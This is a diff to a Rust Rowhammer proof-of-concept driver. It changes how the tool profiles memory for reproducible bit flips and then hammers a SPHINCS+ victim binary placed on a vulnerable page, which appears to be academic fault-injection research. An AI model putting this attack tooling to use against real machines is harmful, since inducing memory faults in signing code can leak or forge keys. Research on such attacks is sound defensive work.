@@ -6,13 +6,12 @@ use std::{
 };
 
 use anyhow::bail;
-use bs_poc::hammerer::blacksmith::hammerer::{FuzzSummary, HammeringPattern, PatternAddressMapper};
 use bs_poc::hammerer::Hammering;
 use bs_poc::memory::{mem_configuration::MemConfiguration, GetConsecPfns};
 use bs_poc::{
     allocator::hugepage::HugepageAllocator,
     hammerer::{make_hammer, HammerResult, HammerStrategy},
-    memory::{BitFlip, DataPattern, Initializable, VictimMemory},
+    memory::{BitFlip, DataPattern, Initializable},
     victim::{HammerVictimError, VictimResult},
 };
 use bs_poc::{
@@ -25,6 +24,10 @@ use bs_poc::{
     hammerer::Hammerer,
 };
 use bs_poc::{hammerer::blacksmith::blacksmith_config::BlacksmithConfig, victim::HammerVictim};
+use bs_poc::{
+    hammerer::blacksmith::hammerer::{FuzzSummary, HammeringPattern, PatternAddressMapper},
+    util::PAGE_MASK,
+};
 use bs_poc::{
     memory::{BytePointer, ConsecBlocks, ConsecCheckBankTiming},
     retry,
@@ -221,12 +224,12 @@ struct RoundProfile {
     pattern: DataPattern,
     duration: Duration,
 }
-#[derive(Debug)]
-struct Profiling {
-    rounds: Vec<RoundProfile>,
-}
 
-/// Hammer a given memory region a number of times to profile for vulnerable addresses.
+type Profiling = Vec<RoundProfile>;
+
+const MIN_REPRO_FRAC: f64 = 0.8;
+
+/// Hammer a given `memory` region `num_rounds` times to profile for vulnerable addresses.
 fn hammer_profile(
     hammerer: &Hammerer,
     memory: &ConsecBlocks,
@@ -245,9 +248,17 @@ fn hammer_profile(
         DataPattern::Random(Box::new(StdRng::from_seed(rand::random()))),
         DataPattern::Random(Box::new(StdRng::from_seed(rand::random()))),
     ] {
+        let mut no_flips_rounds = 0;
         for _ in 0..num_rounds {
             if let Some(p) = p.as_ref() {
                 p.inc(1)
+            }
+            if no_flips_rounds > ((1_f64 - MIN_REPRO_FRAC) * num_rounds as f64) as usize {
+                warn!(
+                    "No flips detected in {} rounds. Stopping profiling, continuing with next pattern",
+                    no_flips_rounds
+                );
+                return rounds;
             }
             let start = std::time::Instant::now();
             let mut victim = victim::MemCheck::new(memory, pattern.clone());
@@ -266,6 +277,9 @@ fn hammer_profile(
                     vec![]
                 }
             };
+            if bit_flips.is_empty() {
+                no_flips_rounds += 1;
+            }
             rounds.push(RoundProfile {
                 bit_flips,
                 pattern: pattern.clone(),
@@ -273,26 +287,28 @@ fn hammer_profile(
             });
         }
     }
-    Profiling { rounds }
+    rounds
 }
+
+type ExperimentError = String;
 
 #[derive(Serialize)]
-enum ExperimentData<T> {
-    Error { date: String, error: String },
-    Results { date: String, results: T },
+struct ExperimentData<T, E> {
+    date: String,
+    result: Result<T, E>,
 }
 
-impl<T> ExperimentData<T> {
-    fn error(error: String) -> Self {
-        Self::Error {
+impl<T, E> ExperimentData<T, E> {
+    fn error(error: E) -> Self {
+        Self {
             date: chrono::Local::now().to_rfc3339(),
-            error,
+            result: Err(error),
         }
     }
-    fn results(results: T) -> Self {
-        Self::Results {
+    fn success(result: T) -> Self {
+        Self {
             date: chrono::Local::now().to_rfc3339(),
-            results,
+            result: Ok(result),
         }
     }
 }
@@ -334,7 +350,7 @@ unsafe fn _main() -> anyhow::Result<()> {
     }
     let mut stats = vec![];
 
-    let mut results: Vec<ExperimentData<HammerResult>> = vec![];
+    let mut results: Vec<ExperimentData<HammerResult, ExperimentError>> = vec![];
     'repeat: for _ in 0..repetitions {
         if let Some(timeout) = timeout {
             if std::time::Instant::now() - start > timeout {
@@ -365,30 +381,14 @@ unsafe fn _main() -> anyhow::Result<()> {
             true,
             None,
         )?;
-        let profiling = hammer_profile(
-            &profile_hammer,
-            &memory,
-            args.profiling_rounds,
-            Some(progress.clone()),
-        );
-        let bit_flips = profiling
-            .rounds
-            .iter()
-            .flat_map(|r| r.bit_flips.iter())
-            .cloned()
-            .collect::<Vec<_>>();
+        let profiling = hammer_profile(&profile_hammer, &memory, 10, Some(progress.clone()));
         // write stats
         if let Some(stats_file) = &args.statistics {
             stats.push(HammerStatistic {
                 alloc_duration_millis: alloc_duration.as_millis(),
                 memory_regions: memory.consec_pfns().unwrap_or_default(),
-                hammer_durations_millis: profiling
-                    .rounds
-                    .iter()
-                    .map(|r| r.duration.as_millis())
-                    .collect(),
+                hammer_durations_millis: profiling.iter().map(|r| r.duration.as_millis()).collect(),
                 bit_flips: profiling
-                    .rounds
                     .iter()
                     .map(|r| r.bit_flips.clone())
                     .collect::<Vec<_>>()
@@ -402,7 +402,53 @@ unsafe fn _main() -> anyhow::Result<()> {
             serde_json::to_writer_pretty(&mut json_file, &stats)?;
             json_file.flush()?;
         }
-        if bit_flips.is_empty() {
+        // filter for reproducible flips
+        // TODO refactor into hammer_profile
+        let profiling = profiling
+            .iter()
+            .group_by(|p| p.pattern.clone())
+            .into_iter()
+            .filter_map(|(pattern, profiles)| {
+                let profiles = profiles.collect_vec();
+                let num_profiles = profiles.len();
+                let flips = profiles
+                    .iter()
+                    .flat_map(|p| p.bit_flips.clone())
+                    .unique_by(|f| f.addr)
+                    .collect_vec();
+                let mut flips_repro = vec![];
+                for flip in flips {
+                    let mut repro = 0;
+                    // find flip in other profiles
+                    for profile in profiles.clone() {
+                        if profile.bit_flips.contains(&flip) {
+                            repro += 1;
+                        }
+                    }
+                    info!(
+                        "Candidate: 0x{:x} reproducible {}/{}",
+                        flip.addr, repro, num_profiles
+                    );
+                    if repro >= (num_profiles as f64 * 0.8).round() as usize {
+                        info!("Accept flip 0x{:x} as reproducible", flip.addr);
+                        flips_repro.push(flip)
+                    }
+                }
+                if !flips_repro.is_empty() {
+                    Some((
+                        pattern.clone(),
+                        RoundProfile {
+                            bit_flips: flips_repro,
+                            pattern,
+                            duration: Duration::default(),
+                        },
+                    ))
+                } else {
+                    None
+                }
+            })
+            .collect_vec();
+        if profiling.is_empty() {
             warn!("No vulnerable addresses found");
             memory.dealloc();
             results.push(ExperimentData::error(
@@ -410,10 +456,13 @@ unsafe fn _main() -> anyhow::Result<()> {
             ));
             continue;
         } else {
-            info!("Profiling done. Found bitflips in {:?}", bit_flips);
+            info!("Profiling done. Found {:?}", profiling);
         }
 
-        let addrs = bit_flips.iter().map(|f| f.addr).collect_vec();
+        let addrs = profiling
+            .iter()
+            .flat_map(|(_, prof)| prof.bit_flips.iter().map(|f| f.addr))
+            .collect_vec();
 
         let mut victim = match make_victim(args.target.clone().unwrap_or(Target::None), addrs) {
             Ok(victim) => victim,
@@ -424,73 +473,30 @@ unsafe fn _main() -> anyhow::Result<()> {
             }
         };
 
-        // TODO reproduce, filter for reproducible flips
-        /*
-        // Find address to use for injection by majority vote
-        let (target_addr, target_offset) = match filter_flips(bit_flips, &targets).last().cloned() {
-            Some((flip, offset)) => (flip.addr, offset),
-            None => {
-                warn!("No suitable addresses found");
-                memory.dealloc();
-                results.push(ExperimentData::error(
-                    "No suitable addresses found".to_string(),
-                ));
-                continue;
-            }
-        };
-
-        // find round with flips in `addr`, get seed
         let dpattern = profiling
-            .rounds
             .iter()
-            .find(|r| r.bit_flips.iter().any(|b| b.addr == target_addr))
-            .expect("no round with flips in addr")
-            .pattern
-            .clone();
-        let success = reproduce_pattern(&profile_hammer, dpattern.clone(), &memory, 10);
-        match success {
-            Ok(success) => {
-                info!("Reproduced pattern {} times", success);
-                const MIN_REPRODUCE: u8 = 8;
-                if success < MIN_REPRODUCE {
-                    warn!(
-                        "Failed to reproduce pattern at least {} times",
-                        MIN_REPRODUCE
-                    );
-                    memory.dealloc();
-                    results.push(ExperimentData::error(
-                        format!(
-                            "Reproduced pattern {} times, expected at least {}",
-                            success, MIN_REPRODUCE
-                        )
-                        .to_string(),
-                    ));
-                    continue;
-                }
-            }
-            Err(e) => {
-                warn!("Failed to reproduce pattern: {:?}", e);
-                memory.dealloc();
-                results.push(ExperimentData::error(format!(
-                    "Failed to reproduce pattern: {:?}",
-                    e
-                )));
-                continue;
-            }
-        }
-        */
-        let dpattern = profiling
-            .rounds
-            .iter()
-            .find(|r| {
-                r.bit_flips
+            .find(|(_, prof)| {
+                prof.bit_flips
                     .iter()
                     .any(|b| b.addr == victim.target_addr() as usize)
             })
-            .map(|r| r.pattern.clone())
+            .map(|(pat, _)| pat.clone())
             .expect("no round with flips in addr");
-        memory.initialize(dpattern.clone());
-        victim.start();
+
+        memory.initialize(dpattern);
+        let target_page = victim.target_addr() as usize & !PAGE_MASK;
+        match victim.start() {
+            Ok(_) => {}
+            Err(e) => {
+                warn!("Failed to start victim: {:?}", e);
+                memory.dealloc();
+                results.push(ExperimentData::error(format!(
+                    "Failed to start victim: {:?}",
+                    e
+                )));
+                continue 'repeat;
+            }
+        }
         let hammer = make_hammer(
             &args.hammerer,
             &pattern.pattern,
@@ -507,7 +513,7 @@ unsafe fn _main() -> anyhow::Result<()> {
             match result {
                 Ok(result) => {
                     info!("Hammering successful: {:?}", result.victim_result);
-                    results.push(ExperimentData::results(result));
+                    results.push(ExperimentData::success(result));
                 }
                 Err(HammerVictimError::NoFlips) => {
                     warn!("No flips detected");
@@ -532,7 +538,7 @@ unsafe fn _main() -> anyhow::Result<()> {
     #[derive(Serialize)]
     struct ExperimentResult {
         args: CliArgs,
-        results: Vec<ExperimentData<HammerResult>>,
+        results: Vec<ExperimentData<HammerResult, ExperimentError>>,
     }
     let res = ExperimentResult { args, results };
     let mut json_file = BufWriter::new(File::create(results_file)?);
@@ -542,7 +548,10 @@ unsafe fn _main() -> anyhow::Result<()> {
 }
 
 #[allow(clippy::result_large_err)]
-fn make_victim(target: Target, addrs: Vec<usize>) -> Result<Victim, ExperimentData<HammerResult>> {
+fn make_victim(
+    target: Target,
+    addrs: Vec<usize>,
+) -> Result<Victim, ExperimentData<HammerResult, ExperimentError>> {
     match target {
         Target::SphincsPlus { binary } => Ok(Victim::SphincsPlus(
             victim::SphincsPlus::new(binary, addrs).map_err(|e| {
@@ -552,35 +561,6 @@ fn make_victim(target: Target, addrs: Vec<usize>) -> Result<Victim, ExperimentDa
         )),
         Target::None => Err(ExperimentData::error("No target specified".to_string())),
     }
-}
-
-fn reproduce_pattern<H: Hammering>(
-    hammer: &H,
-    pattern: DataPattern,
-    memory: &dyn VictimMemory,
-    rounds: usize,
-) -> anyhow::Result<u8> {
-    // reproduce pattern 10 times
-    let mut victim = victim::MemCheck::new(memory, pattern.clone());
-    let mut success = 0;
-    for i in 0..rounds {
-        let result = hammer.hammer(&mut victim);
-        match result {
-            Ok(result) => {
-                let flips = result.victim_result.bit_flips();
-                if flips.is_empty() {
-                    warn!("Failed to reproduce pattern in run {}: no flips", i);
-                } else {
-                    info!("Reproduced pattern in run {}: {:?}", i, flips);
-                    success += 1;
-                }
-            }
-            Err(e) => {
-                warn!("Failed to reproduce pattern in run {}: {:?}", i, e);
-            }
-        }
-    }
-    Ok(success)
 }
 
 #[derive(Serialize)]
@@ -597,7 +577,7 @@ impl Victim {
 }
 
 impl HammerVictim for Victim {
-    fn start(&mut self) {
+    fn start(&mut self) -> Result<(), HammerVictimError> {
         match self {
             Victim::SphincsPlus(v) => v.start(),
         }
